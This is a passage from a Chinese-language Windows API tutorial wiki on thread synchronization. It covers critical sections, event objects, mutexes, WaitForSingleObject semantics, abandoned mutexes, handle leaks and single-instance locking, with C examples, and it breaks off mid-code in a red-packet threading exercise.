临界区对象，用于保护共享资源的访问int g_Iterations = 10; // 设置生产者和消费者各执行10次int g_Buffer = 0; // 共享资源，表示缓冲区的数据BOOL g_HasValue = FALSE; // 标记变量，表示共享资源是否有值// 生产者线程函数DWORD WINAPI ThreadProducer(LPVOID pM)&#123; for (int i = 0; i &lt; g_Iterations; ) &#123; // 进入临界区 EnterCriticalSection(&amp;g_cs); if (g_HasValue) // 如果共享资源有值，跳过生产 &#123; printf(&quot;生产者%d的CPU执行权被浪费了，因为缓冲区已有数据 &quot;, GetCurrentThreadId()); LeaveCriticalSection(&amp;g_cs); Sleep(1); // 让出CPU continue; &#125; g_Buffer = 1; // 将数据放入缓冲区 g_HasValue = TRUE; // 标记为已生产 printf(&quot;生产者%d将数据%d放入缓冲区 &quot;, GetCurrentThreadId(), g_Buffer); i++; // 仅在成功生产时增加计数 // 离开临界区 LeaveCriticalSection(&amp;g_cs); &#125; return 0;&#125;// 消费者线程函数DWORD WINAPI ThreadConsumer(LPVOID pM)&#123; for (int i = 0; i &lt; g_Iterations; ) &#123; // 进入临界区 EnterCriticalSection(&amp;g_cs); if (!g_HasValue) // 如果共享资源无值，跳过消费 &#123; printf(&quot;----消费者%d的CPU执行权被浪费了，因为缓冲区没有数据 &quot;, GetCurrentThreadId()); LeaveCriticalSection(&amp;g_cs); Sleep(1); // 让出CPU continue; &#125; g_Buffer = 0; // 将数据从缓冲区取出 g_HasValue = FALSE; // 标记为已消费 printf(&quot;----消费者%d将数据%d从缓冲区取出 &quot;, GetCurrentThreadId(), g_Buffer); i++; // 仅在成功消费时增加计数 // 离开临界区 LeaveCriticalSection(&amp;g_cs); &#125; return 0;&#125;int main(int argc, char* argv[])&#123; // 初始化临界区对象 InitializeCriticalSection(&amp;g_cs); HANDLE hThreads[2]; hThreads[0] = CreateThread(NULL, 0, ThreadProducer, NULL, 0, NULL); // 生产者线程 hThreads[1] = CreateThread(NULL, 0, ThreadConsumer, NULL, 0, NULL); // 消费者线程 WaitForMultipleObjects(2, hThreads, TRUE, INFINITE); CloseHandle(hThreads[0]); CloseHandle(hThreads[1]); // 销毁临界区对象 DeleteCriticalSection(&amp;g_cs); return 0;&#125; 运行输出1234567891011121314151617181920212223242526272829303132333435363738394041424344454647生产者19580将数据1放入缓冲区生产者19580的CPU执行权被浪费了，因为缓冲区已有数据----消费者48992将数据0从缓冲区取出----消费者48992的CPU执行权被浪费了，因为缓冲区没有数据----消费者48992的CPU执行权被浪费了，因为缓冲区没有数据生产者19580将数据1放入缓冲区生产者19580的CPU执行权被浪费了，因为缓冲区已有数据----消费者48992将数据0从缓冲区取出----消费者48992的CPU执行权被浪费了，因为缓冲区没有数据生产者19580将数据1放入缓冲区生产者19580的CPU执行权被浪费了，因为缓冲区已有数据生产者19580的CPU执行权被浪费了，因为缓冲区已有数据----消费者48992将数据0从缓冲区取出----消费者48992的CPU执行权被浪费了，因为缓冲区没有数据----消费者48992的CPU执行权被浪费了，因为缓冲区没有数据生产者19580将数据1放入缓冲区生产者19580的CPU执行权被浪费了，因为缓冲区已有数据生产者19580的CPU执行权被浪费了，因为缓冲区已有数据----消费者48992将数据0从缓冲区取出----消费者48992的CPU执行权被浪费了，因为缓冲区没有数据----消费者48992的CPU执行权被浪费了，因为缓冲区没有数据生产者19580将数据1放入缓冲区生产者19580的CPU执行权被浪费了，因为缓冲区已有数据生产者19580的CPU执行权被浪费了，因为缓冲区已有数据----消费者48992将数据0从缓冲区取出----消费者48992的CPU执行权被浪费了，因为缓冲区没有数据----消费者48992的CPU执行权被浪费了，因为缓冲区没有数据生产者19580将数据1放入缓冲区生产者19580的CPU执行权被浪费了，因为缓冲区已有数据生产者19580的CPU执行权被浪费了，因为缓冲区已有数据----消费者48992将数据0从缓冲区取出----消费者48992的CPU执行权被浪费了，因为缓冲区没有数据生产者19580将数据1放入缓冲区生产者19580的CPU执行权被浪费了，因为缓冲区已有数据----消费者48992将数据0从缓冲区取出----消费者48992的CPU执行权被浪费了，因为缓冲区没有数据----消费者48992的CPU执行权被浪费了，因为缓冲区没有数据生产者19580将数据1放入缓冲区生产者19580的CPU执行权被浪费了，因为缓冲区已有数据----消费者48992将数据0从缓冲区取出----消费者48992的CPU执行权被浪费了，因为缓冲区没有数据生产者19580将数据1放入缓冲区生产者19580的CPU执行权被浪费了，因为缓冲区已有数据----消费者48992将数据0从缓冲区取出----消费者48992的CPU执行权被浪费了，因为缓冲区没有数据生产者19580将数据1放入缓冲区----消费者48992将数据0从缓冲区取出 使用标记变量能做到同步控制，但是这样有大量的CPU时间被浪费：已生产情况下，重复执行跳过生产的代码；消费者那边同理。 我们需要的是，当生产者生产完，就“通知”到消费者进行消费。（生产者主动让出自己的CPU时间片，让给消费者）mark，这里就是线程主动去睡眠了？ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;int g_Iterations = 10; // 设置生产者和消费者各执行10次int g_Buffer = 0; // 共享资源，表示缓冲区的数据HANDLE g_hProduceEvent; // 用于生产者线程的事件对象HANDLE g_hConsumeEvent; // 用于消费者线程的事件对象// 生产者线程函数DWORD WINAPI ThreadProducer(LPVOID pM)&#123; for (int i = 0; i &lt; g_Iterations; i++) // 执行10次 &#123; // 等待消费事件被设置为有信号状态 WaitForSingleObject(g_hConsumeEvent, INFINITE); g_Buffer = 1; // 将数据放入缓冲区 printf(&quot;生产者%d将数据%d放入缓冲区 &quot;, GetCurrentThreadId(), g_Buffer); // 设置生产事件为有信号状态，表示已生产，通知消费者消费 SetEvent(g_hProduceEvent); &#125; return 0;&#125;// 消费者线程函数DWORD WINAPI ThreadConsumer(LPVOID pM)&#123; for (int i = 0; i &lt; g_Iterations; i++) // 执行10次 &#123; // 等待生产事件被设置为有信号状态 WaitForSingleObject(g_hProduceEvent, INFINITE); g_Buffer = 0; // 将数据从缓冲区取出 printf(&quot;----消费者%d将数据%d从缓冲区取出 &quot;, GetCurrentThreadId(), g_Buffer); // 设置消费事件为有信号状态，表示已消费，通知生产者生产 SetEvent(g_hConsumeEvent); &#125; return 0;&#125;int main(int argc, char* argv[])&#123; g_hProduceEvent = CreateEvent(NULL, FALSE, FALSE, NULL); g_hConsumeEvent = CreateEvent(NULL, FALSE, TRUE, NULL); // 初始有信号 生产者先生产 HANDLE hThreads[2]; hThreads[0] = CreateThread(NULL, 0, ThreadProducer, NULL, 0, NULL); // 生产者线程 hThreads[1] = CreateThread(NULL, 0, ThreadConsumer, NULL, 0, NULL); // 消费者线程 WaitForMultipleObjects(2, hThreads, TRUE, INFINITE); CloseHandle(hThreads[0]); CloseHandle(hThreads[1]); // 关闭事件对象 CloseHandle(g_hProduceEvent); CloseHandle(g_hConsumeEvent); return 0;&#125; 运行输出1234567891011121314151617181920生产者4696将数据1放入缓冲区----消费者49412将数据0从缓冲区取出生产者4696将数据1放入缓冲区----消费者49412将数据0从缓冲区取出生产者4696将数据1放入缓冲区----消费者49412将数据0从缓冲区取出生产者4696将数据1放入缓冲区----消费者49412将数据0从缓冲区取出生产者4696将数据1放入缓冲区----消费者49412将数据0从缓冲区取出生产者4696将数据1放入缓冲区----消费者49412将数据0从缓冲区取出生产者4696将数据1放入缓冲区----消费者49412将数据0从缓冲区取出生产者4696将数据1放入缓冲区----消费者49412将数据0从缓冲区取出生产者4696将数据1放入缓冲区----消费者49412将数据0从缓冲区取出生产者4696将数据1放入缓冲区----消费者49412将数据0从缓冲区取出"},{"title":"互斥体（Mutex）","path":"/wiki/Windows_API/互斥体.html","content":"内核级临界资源怎么办？ 上一节讲的线程锁只能控制同一进程中不同线程对临界资源的访问，如果临界资源是内核级，即多进程都能同时访问该临界资源怎么办？ 那么我们就需要一个放在“内核中的令牌”来控制。Windows提供的互斥锁（mutex object），就是一个在内核种的内核对象，能被多进程访问到，换句话说，能用来控制多进程对内核临界资源的访问。 知识说明 参考： CreateMutexA Wait Functions WaitForSingleObject function ReleaseMutex function Mutex Objects（重点看这个，写得很详细了） Using Mutex Objects（代码示例） mutex object 互斥对象（Mutex Objects）是Windows环境下的一个重要的内核对象（Kernel Object），它被用来控制在多线程环境中对临界资源的访问。互斥对象确保在任何时刻只有一个线程能够访问特定的资源或代码段，从而避免了资源竞争和数据不一致的问题。 当一个线程需要访问由互斥对象保护的临界资源时，它必须首先通过调用等待函数（Wait Functions）来请求互斥对象的所有权。这些等待函数包括 WaitForSingleObject 和 WaitForMultipleObjects。如果互斥对象已被另一个线程占有，那么请求它的线程将会被阻塞（blocked），直到占有该互斥对象的线程通过调用 ReleaseMutex 函数来释放（release）它。在释放后，其他线程才有机会获得该互斥对象的所有权，并访问相应的资源。If more than one thread is waiting on a mutex, a waiting thread is selected. Do not assume a first-in, first-out (FIFO) order. External events such as kernel-mode APCs can change the wait order. 在互斥对象的状态方面，当它没有被任何线程拥有时，互斥对象处于触发状态（signaled）。相反，当一个线程获得了互斥对象的所有权，互斥对象则处于非触发状态（nonsignaled）。这些状态对等待函数的行为产生影响：只有当互斥对象处于触发状态时，等待函数才会允许另一个线程获得所有权。 如果一个线程在未释放其所拥有的互斥对象的情况下终止，该互斥对象会被视为遗弃的（abandoned）。在这种情况下，等待该互斥对象的其他线程可以获得其所有权（如果是线程锁，EnterCriticalSection后没有LeaveCriticalSection，那么其他线程就永远无法EnterCriticalSection，会一直阻塞），但等待函数（如 WaitForSingleObject）会返回一个特殊的值 WAIT_ABANDONED，指示互斥对象已被遗弃。遗弃的互斥对象意味着发生了错误，并且互斥对象保护的任何共享资源都处于未定义状态。如果线程继续执行，就好像互斥对象没有被遗弃一样，一旦该线程释放了对互斥对象的所有权，互斥对象就不再被视为遗弃。这样，如果稍后在等待函数中再次指定该互斥对象的句柄，它将恢复正常行为。（在临界区中意外退出没来得及Release互斥对象的代码示例在这里） 一个线程可以同时拥有多个不同的互斥对象，但任何时候一个互斥对象只能被一个线程所拥有。这意味着，虽然一个线程可以控制对多个资源的访问，但每个资源（由不同的互斥对象保护）在同一时刻只能被一个线程访问。 CreateMutex 线程通过调用CreateMutex来创建一个mutex object。 12345HANDLE CreateMutexA( [in, optional] LPSECURITY_ATTRIBUTES lpMutexAttributes, // SD 安全属性，包含安全描述符 [in] BOOL bInitialOwner, [in, optional] LPCSTR lpName // mutex object name 互斥体的名字); 参数 bInitialOwner，布尔值，表示创建后的这个mutex object是否立即由调用线程所拥有： TRUE 如果这个互斥对象是第一次被创建，那么创建它的线程（调用 CreateMutex 的线程）会立即成为这个互斥对象的所有者。 如果这个互斥对象之前已经被创建过（即此时 CreateMutex 实际上是打开一个已存在的互斥对象），那么调用线程不会立即成为互斥对象的所有者。在这种情况下，即使 bInitialOwner 设置为 TRUE，调用线程也需要通过等待函数（如 WaitForSingleObject）来请求互斥对象的所有权。 FALSE：调用线程不会立即获得互斥对象的所有权。无论该互斥对象是否是新创建的，调用线程都需要使用等待函数来请求所有权。 在多进程环境中，不同的进程可以创建同名的互斥对象。当一个互斥对象首次被某个进程创建时，它是新创建的；如果后来另一个进程尝试创建同名的互斥对象，CreateMutex 会返回已存在的互斥对象的句柄。在这种情况下，建议设置 bInitialOwner 标志为 FALSE。这样，无论哪个进程最先创建互斥对象，都不会立即获得所有权，从而避免了不清楚哪个进程先获得所有权的问题。这样做有助于保持所有权的明确性和一致性，特别是当使用命名互斥对象来实现跨进程的资源访问控制时。 返回值 函数调用成功： 这个mutex object是第一次创建，返回值为这个互斥对象的handle 这个mutex object已存在，返回值为这个已存在互斥对象的handle。GetLaseError获得的返回值是ERROR_ALREADY_EXISTS 函数调用失败： 返回值为NULL。调GetLaseError获得额外信息 例 例子中的互斥对象都是第一次创建 bInitialOwner设置为TRUEbInitialOwner设置为FALSEbInitialOwner设置为TRUE1234567891011121314HANDLE hMutex = CreateMutex( // Create a mutex with initial owner NULL, // default security attributes TRUE, // initially owned by the calling thread &quot;XYZ&quot;); // named mutex：“XYZ”// 名字为XYZ的mutex object是第一次被创建，创建后立即被calling thread所以拥有// 所以该线程可以直接访问临界资源，// 而无需调用Wait Functions(如WaitForSingleObject或WaitForMultipleObjects)去请求互斥对象的所有权// 如果再次调用WaitForSingleObject(hMutex, INFINITE)，因为当前线程已拥有该互斥对象的所有权，所以函数无需等待，立即返回/*** 访问临界资源 ***/ReleaseMutex(hMutex); // 释放所有权，不释放的话其他线程会阻塞在等待函数，因为请求不到mutex object的所有权CloseHandle(hMutex); // mutex object也是内核对象，关闭句柄bInitialOwner设置为FALSE1234567891011121314HANDLE hMutex = CreateMutex( // Create a mutex with no initial owner NULL, // default security attributes FALSE, // initially not owned &quot;XYZ&quot;); // named mutex：“XYZ”// 情况一：名字为XYZ的mutex object是第一次被创建，创建后没有拥有者，处于signaled状态// 情况二：名字为XYZ的mutex object已存在，则CreateMutex返回的是已存在的mutex object的handle// 线程想使用的话需要调Wait Functions来请求这个互斥对象的所有权，然后才能访问临界资源WaitForSingleObject(hMutex, INFINITE); // 等待取得互斥对象的拥有权，假设是无限等/*** 访问临界资源 ***/ReleaseMutex(hMutex); // 释放所有权，不释放的话其他线程会阻塞在等待函数，因为请求不到mutex object的所有权CloseHandle(hMutex); // mutex object也是内核对象，关闭句柄 WaitForSingleObject再理解 前言 在前面创建线程的章节，创建线程后WaitForSingleObject(hThread, INFINITE);，这里的WaitForSingleObject就是在等线程函数执行完；然后在这篇互斥体的内容中，创建/获取互斥对象后调用WaitForSingleObject(hMutex, INFINITE);，这里的WaitForSingleObject的含义是等待取得互斥对象的拥有权。然后看MSDN上对WaitForSingleObject的描述是Waits until the specified object is in the signaled state or the time-out interval elapses.怎么将对于不同内核对象统一起来理解呢？ 回答 WaitForSingleObject 在Windows编程中确实是一个多用途的同步机制，它的行为取决于传递给它的对象类型。为了统一解释这个函数的行为，可以关注它的核心功能：“等待直到指定对象进入已通知状态或超时间隔结束”。 这个“已通知状态（signaled state）”的含义会根据传递给 WaitForSingleObject 的对象类型而变化： 当传递线程句柄（hThread）时：这里的“已通知状态”意味着线程已经完成了它的执行。也就是说，WaitForSingleObject 等待目标线程执行完毕。当线程结束时，它的状态变为“已通知”，此时 WaitForSingleObject 停止阻塞，调用线程可以继续执行。 当传递互斥对象（mutex object）时：在这种情况下，“已通知状态”指的是互斥对象变得可用（即没有被其他线程拥有）。WaitForSingleObject 在这里用于等待获取互斥对象的所有权。如果互斥对象已被其他线程占用，调用线程将会阻塞，直到互斥对象被释放并变为“已通知”状态，此时调用线程获取其所有权。 因此，WaitForSingleObject 的核心功能是等待，但“等待什么”取决于它所等待的对象类型。无论是等待线程结束还是等待获取互斥对象的所有权，都是基于同一个基本原理：等待一个对象从“非通知状态（nonsignaled state）”变为“已通知状态（signaled state）”。这个等待过程可能会因为超时而结束，如果指定了超时时间的话。 内核对象这种状态的切换是由Microsoft为每个对象建立的一套规则来决定的，在内核中其实就是个BOOL值，nonsignaled state为FALSE，signaled state为TRUE 上面的前言和回答是最早的理解，现在理解有更新，内容如下 WaitForSingleObject的作用是等待一个内核对象（MSDN上可以看到可以等哪些内核对象），不同的内核对象，这个等待的含义是不一样的。我们要关注： 等待的含义 是否会修改到等待内核对象的状态 可以被等待的对象 等待对象成功的含义 是否会修改到等待内核对象的状态 线程 (Thread) 等待线程结束 不会，线程结束后状态自然变化 进程 (Process) 等待进程结束 不会，进程结束后状态自然变化 事件 (Event) 等待 Event 有信号 如果是自动重置事件，等待函数返回时，状态将自动重置为无信号如果是手动重置事件，状态不会自动改变，需要手动重置 互斥体 (Mutex) 等待持有 Mutex 的线程释放该 Mutex，等待成功后拥有该 Mutex 会，调用线程获取 Mutex 后其状态变为无信号 信号量 (Semaphore) 等待该 Semaphore 对象有信号 会，调用 WaitForSingleObject 会使信号量的计数减一 线程 (Thread)：等待线程对象时，意味着等待指定的线程执行结束。线程的状态在其自然结束时变化，不是由等待操作引起的。 进程 (Process)：类似于线程，等待进程对象意味着等待该进程结束运行。进程状态的改变是由于进程的结束，而非等待操作。 事件 (Event)：事件对象可以配置为自动重置或手动重置。 如果是自动重置事件，当等待函数返回时，系统自动将事件状态设置回无信号状态； 如果是手动重置，则状态不会自动改变，需要手动重置。 互斥体 (Mutex)：等待互斥体对象成功意味着当前线程获取了该互斥体的所有权。在此之后，互斥体的状态变为无信号，表示它被当前线程持有，直至该线程释放互斥体。 信号量 (Semaphore)：信号量的等待涉及信号量的计数。当 WaitForSingleObject 成功返回时，表示线程已经消耗了一个信号量单位，信号量的计数相应减少。 参考：3.6 Windows 线程资源同步对象 经验之谈 写代码逻辑复杂时可能会出现连续使用WaitForSingleObject的情况，此时要注意这个等待是否会改变等待内核对象的状态 等待一个线程内核对象12345// 创建一个线程hThread = CreateThread(NULL, 0, ThreadProc, &amp;threadId1, 0, NULL);WaitForSingleObject(hThread, INFINITE); // 等待线程执行完毕WaitForSingleObject(hThread, INFINITE); // 立即返回，因为线程已结束WaitForSingleObject(hThread, INFINITE); // 立即返回，因为线程已结束 第一个 WaitForSingleObject(hThread, INFINITE) 等待线程执行完毕。 后续的 WaitForSingleObject(hThread, INFINITE) 调用会立即返回，因为线程已经处于终止状态，这种状态是永久的。 等待一个Mutex内核对象12345678// 创建一个互斥体HANDLE hMutex = CreateMutex(NULL, FALSE, NULL); // 不被创建者拥有WaitForSingleObject(hMutex, INFINITE); // 得到Mutex，会将Mutex修改为无信号//ReleaseMutex(hMutex); // 释放Mutex，将其状态改为有信号WaitForSingleObject(hMutex, INFINITE); // 再次阻塞，直到Mutex被释放变为有信号//ReleaseMutex(hMutex); // 释放Mutex，允许其他等待的线程继续执行WaitForSingleObject(hMutex, INFINITE); // 再次阻塞，等待Mutex变为有信号//ReleaseMutex(hMutex); // 最终释放Mutex 第一个 WaitForSingleObject(hMutex, INFINITE) 尝试获取互斥体，如果获取成功，会将互斥体状态设为无信号，表示它被当前线程持有。 必须调用 ReleaseMutex(hMutex) 来释放互斥体，之后互斥体状态变回有信号，其他线程（或当前线程再次调用）才可以再次获取它。 如果没有释放互斥体，任何后续的 WaitForSingleObject 调用都会阻塞，直到互斥体被释放。 WaitForSingleObject返回值 函数调用成功： WAIT_OBJECT_0，表示成功“等待”到设置的对象 WAIT_TIMEOUT，等待超时 WAIT_ABANDONED，当等待的对象是Mutex类型时，如果持有该Mutex对象的线程已经结束，但是没有在结束前释放该Mutex，此时该Mutex已经处于废弃状态，其行为是未知的，不建议再使用该Mutex 函数调用失败： 返回值为WAIT_FAILED，调GetLaseError得到具体错误码 获得互斥对象后，进入临界区，在临界区中意外退出，没及时释放互斥对象，其他处于等待请求该互斥对象的线程能得到这个互斥对象，WaitForSingleObject返回值为WAIT_ABANDONED。 程序B123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main()&#123; HANDLE hMutex = CreateMutex(NULL, FALSE, &quot;Mutex&quot;); if (hMutex == NULL) &#123; printf(&quot;CreateMutex error: %d &quot;, GetLastError()); return 1; &#125; getchar(); // 保持等待 printf(&quot;输入任意键继续 &quot;); DWORD waitResult = WaitForSingleObject(hMutex, INFINITE); switch (waitResult) &#123; case WAIT_ABANDONED: // 处理遗弃的互斥对象的情况 printf(&quot;Mutex was abandoned. &quot;); break; case WAIT_OBJECT_0: // 访问受互斥对象保护的资源 printf(&quot;Mutex acquired. &quot;); printf(&quot;Ready to call ExitProcess. &quot;); ExitProcess(0); // 模拟意外退出 break; default: printf(&quot;Wait error: %d &quot;, GetLastError()); return 1; &#125; getchar(); // 防止控制台退出 // ... if (!ReleaseMutex(hMutex)) &#123; printf(&quot;Error releasing mutex: %d &quot;, GetLastError()); &#125; CloseHandle(hMutex); return 0;&#125; 起来两个cmd，都运行这个TestB程序，都会卡在第13行的getchar()，此时某个进程已创建了&quot;Mutex&quot;互斥对象，另外一个相当于打开这个互斥对象获得了句柄，但它们都还没拥有。 1号cmd（左边的）：按下回车，拥有了互斥对象，switch走WAIT_OBJECT_0，然后执行ExitProcess(0);意外退出，没来得及释放互斥对象。（此时进程消亡了，但因为2号cmd还有handle指向&quot;Mutex&quot;互斥对象，所以&quot;Mutex&quot;互斥对象计数器不为0，没释放 2号cmd（右边的）：回车，拿到的互斥对象是1号cmd中ABANDONED的互斥对象，switch走WAIT_ABANDONED WaitForMultipleObjects 等待多个内核对象 123456DWORD WaitForMultipleObjects( [in] DWORD nCount, // number of handles in array 内核对象的数量 [in] const HANDLE *lpHandles, // object-handle array 内核对象的句柄数组 [in] BOOL bWaitAll, // wait option 等待模式 [in] DWORD dwMilliseconds // time-out interval 等待超时时间（毫秒）); 返回值 在参数bWaitAll设置为 FALSE 的情况下（即等待任一对象的状态发生变更） 函数调用成功： WAIT_TIMEOUT，等待超时 WAIT_OBJECT_0 ～ (WAIT_OBJECT_0 + nCount– 1)**，表示成功“等待”到设置的对象 通过nCount– 1可以知道是等待对象数组中哪个对象状态发生了改变 举个例子，假设现在等待三个对象A1、A2、A3，它们在数组lpHandles中的下标依次是0、1、2，某次WaitForMultipleObjects返回值是 Wait_OBJECT_0 + 1，则表示对象A2有信号，导致WaitForMultipleObjects调用成功返回。 123456789101112131415161718192021222324HANDLE waitHandles[3];waitHandles[0] = hA1Handle;waitHandles[1] = hA2Handle;waitHandles[2] = hA3Handle;DWORD dwResult = WaitForMultipleObjects(3, waitHandles, FALSE, 3000);switch(dwResult)&#123; case WAIT_OBJECT_0 + 0: //A1 有信号 break; case WAIT_OBJECT_0 + 1: //A2 有信号 break; case WAIT_OBJECT_0 + 2: //A3 有信号 break; default: //出错或超时 break;&#125; WAIT_ABANDONED_0 ～ (WAIT_ABANDONED_0 + nCount– 1)，当等待的对象是Mutex类型时，如果持有该Mutex对象的线程已经结束，但是没有在结束前释放该Mutex，此时该Mutex已经处于废弃状态，其行为是未知的，不建议再使用该Mutex。 通过nCount - 1可以知道是等待对象数组中哪个对象始终没有被其他线程释放使用权 函数调用失败： 返回值为WAIT_FAILED，调GetLaseError得到具体错误码 内核资源泄露 内核对象泄露的问题只存在于程序运行时，程序结束了（无论是正常结束还是异常退出），Windows都会保证内核对象的清理释放。如果一个程序一直再运行，没有CloseHandle计数器，内核对象就会一直占用空间（高2G），就会导致资源泄露（leak）。 比如C++服务端开发，堆内存没有及时释放，这个服务器运行时间长了就会崩掉 防止内核对象泄露的常见代码：WaitForMultipleObjects等待全部受信，后面的代码紧接着就是CloseHandle 1234567// 等待所有线程结束WaitForMultipleObjects(4, threads, TRUE, INFINITE);// 关闭线程句柄for (i = 0; i &lt; 4; i++)&#123; CloseHandle(threads[i]);&#125; 互斥体VS临界区锁 都是请求令牌，没令牌就等待，只有拿到令牌才能访问临界资源，访问完了要归还令牌。 123456789101112131415CRITICAL_SECTION cs;void main()&#123; //初始化临界区资源 InitializeCriticalSection(&amp;cs); //进入临界区 EnterCriticalSection(&amp;cs); /***临界区***/ //离开临界区 LeaveCriticalSection(&amp;cs); //删除临界区资源 DeleteCriticalSection(&amp;cs); &#125; 1234567891011121314// 创建互斥体HANDLE hMutex = CreateMutex(NULL, FALSE, &quot;XYZ&quot;); // 获取令牌 WaitForSingleObject(hMutex, INFINITE); /***临界区***/// 释放令牌 ReleaseMutex(hMutex); // 关闭句柄CloseHandle(hMutex); 临界区锁只能用于单个进程间的线程控制 互斥体可以设定等待超时，但临界区锁不能 通过WaitForSingleObject设置等待时间 线程意外结束时，互斥体可以避免无限等待，而临界区锁不能 互斥体效率没有线程锁高 因为是互斥体是内核对象，而临界区锁是进程中的 互斥体应用之一-防程序多开 防程序多开有很多种方式，互斥体只是其中的一种。互斥体用于防止一个程序多开是利用了这些特点： mutex object是内核对象，可以被多进程访问到 如果mutex object已存在，CreateMutex调用其实是打开一个已存在的互斥对象。GetLaseError获得的返回值是ERROR_ALREADY_EXISTS 这个mutex object是第一次创建，返回值为这个互斥对象的handle 123456789101112131415161718192021222324252627282930313233#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main()&#123; // 创建一个名为MyUniqueProgramMutex的互斥对象 HANDLE hMutex = CreateMutex(NULL, FALSE, &quot;MyUniqueProgramMutex&quot;); // 判断互斥体创建成功or失败 if (hMutex == NULL) &#123; printf(&quot;CreateMutex error: %d &quot;, GetLastError()); return 1; &#125; // 先前是否已创建过这个mute object if (GetLastError() == ERROR_ALREADY_EXISTS) &#123; printf(&quot;已经有一个正在运行了。 &quot;); CloseHandle(hMutex); getchar(); return 1; &#125; printf(&quot;程序正在运行，按任意键退出... &quot;); getchar(); // 保持等待 ReleaseMutex(hMutex); // 释放互斥对象 CloseHandle(hMutex); // 关闭句柄 return 0;&#125; 但这样有一个潜在的风险：恶意用户可能在你的应用程序尝试创建该互斥对象之前先创建同名的互斥对象，从而阻止你的应用程序启动。有两种常见解决办法： 创建一个随机命名的互斥对象，并将名称存储在只有授权用户能访问的地方。这样，恶意用户就很难猜测或提前创建同名的互斥对象。 123456789101112131415161718#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;time.h&gt;int main() &#123; char mutexName[256]; HANDLE hMutex; // 生成一个随机名称的互斥对象 srand((unsigned)time(NULL)); snprintf(mutexName, sizeof(mutexName), &quot;MyAppMutex_%d&quot;, rand()); // 尝试创建互斥对象 hMutex = CreateMutex(NULL, FALSE, mutexName); // ...其余代码与前面的例子相同...&#125; 使用文件来实现单实例限制。这种方法是在用户的个人资料目录中创建一个被锁定的文件，用文件的存在与否来判断程序是否已运行。 123456789101112131415161718192021222324252627#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main() &#123; const char* filePath = &quot;C:\\\\Users\\\\&lt;username&gt;\\\\MyApp.lock&quot;; HANDLE hFile; // 尝试创建锁定文件 hFile = CreateFile(filePath, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL); if (hFile == INVALID_HANDLE_VALUE) &#123; if (GetLastError() == ERROR_FILE_EXISTS) &#123; printf(&quot;应用程序已在运行。 &quot;); return 1; &#125; printf(&quot;无法创建锁定文件。 &quot;); return 1; &#125; printf(&quot;应用程序正在运行，按任意键退出... &quot;); getchar(); CloseHandle(hFile); DeleteFile(filePath); // 删除锁定文件 return 0;&#125; 这个示例中，我们尝试在用户的个人资料目录中创建一个特定的文件。如果文件创建成功，表明程序实例尚未运行。如果文件已存在，表示程序已经在运行。 注意：在实际应用中，你需要将 &lt;username&gt; 替换为实际的用户名，或者使用函数动态获取用户的目录路径。 Linux中常见的防应用程序多开的方法就是使用锁文件（lock file）。这种方法的核心思想是在文件系统中创建一个特定的文件，作为程序正在运行的标志。当程序启动时，它会检查这个文件是否存在，如果不存在，则创建该文件并继续执行；如果文件已经存在，则表明另一个实例已在运行，程序通常会退出。这种方法的一个重要注意事项是在程序退出时（无论是正常退出还是因为错误、异常退出）确保删除该锁定文件。否则，可能会导致程序即使没有运行，也不能再次启动的情况。 12345678910111213141516171819202122232425262728293031323334#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/file.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;int main() &#123; const char* lockFile = &quot;/tmp/myapp.lock&quot;; int fd = open(lockFile, O_CREAT | O_RDWR, 0666); if (fd == -1) &#123; perror(&quot;无法打开锁定文件&quot;); return 1; &#125; // 尝试对文件加锁 if (flock(fd, LOCK_EX | LOCK_NB) == -1) &#123; perror(&quot;无法获取文件锁，应用程序可能已在运行&quot;); close(fd); return 1; &#125; printf(&quot;应用程序正在运行，按Ctrl+C退出... &quot;); while (1) &#123; // 应用程序的主循环 sleep(1); // 这里只是一个示例，实际应用中应替换为实际的逻辑 &#125; // 清理 flock(fd, LOCK_UN); close(fd); remove(lockFile); return 0;&#125; 其他（未来需要再查MSDN） unnamed的mutex object lpName字段可以指定mutex object是本地或全局的 多线程抢红包练习 红包池中有初始金额1000，点击开始抢红包后，3个线程开始抢红包池中的红包，每次抢50。红包池中金额为0时抢红包结束。检验互斥控制是否做好的标准：抢红包结束后，线程123三个框总数加起来为1000。分别使用临界区锁和互斥体锁两种方法分别进行互斥控制。 tips： 在WM_COMMAND中新起一个工作线程，在这个工作线程中起3个线程来抢红包，防止UI卡顿 抢红包线程末尾进行Sleep，防止一个线程运行时就将红包抢完 记得释放资源，CloseHandle，删除临界区/释放互斥锁 过程临界区锁互斥体123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125#include &quot;resource.h&quot;#include &lt;Windows.h&gt;#include &lt;stdio.h&gt; //sprintfBOOL CALLBACK DialogProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam);DWORD WINAPI WorkerThreadProc(LPVOID lpParameter);DWORD WINAPI ThreadFunc(LPVOID lpParameter);CRITICAL_SECTION g_cs;HWND g_hEdit_RedPacket = NULL;HWND g_hEdit_Thread1 = NULL;HWND g_hEdit_Thread2 = NULL;HWND g_hEdit_Thread3 = NULL;int APIENTRY WinMain(HINSTANCE hInstance, // 当前程序实例的句柄 HINSTANCE hPrevInstance, // 前一个实例的句柄，不再使用 LPSTR lpCmdLine, // 命令行参数 int nCmdShow // 控制窗口显示方式的标志)&#123; DialogBox(hInstance, //当前程序的实例句柄 MAKEINTRESOURCE(IDD_DIALOG_MAIN), //对话框模板的名称或资源标识符 NULL, //父窗口句柄，这里无，为NULL DialogProc //对话框消息处理函数 ); return 0;&#125;BOOL CALLBACK DialogProc(HWND hwndDlg, // handle to dialog box UINT uMsg, // message WPARAM wParam, // first message parameter LPARAM lParam // second message parameter )&#123; switch (uMsg) &#123; case WM_INITDIALOG: g_hEdit_RedPacket = GetDlgItem(hwndDlg, IDC_EDIT_REDPACKETPOOL); g_hEdit_Thread1 = 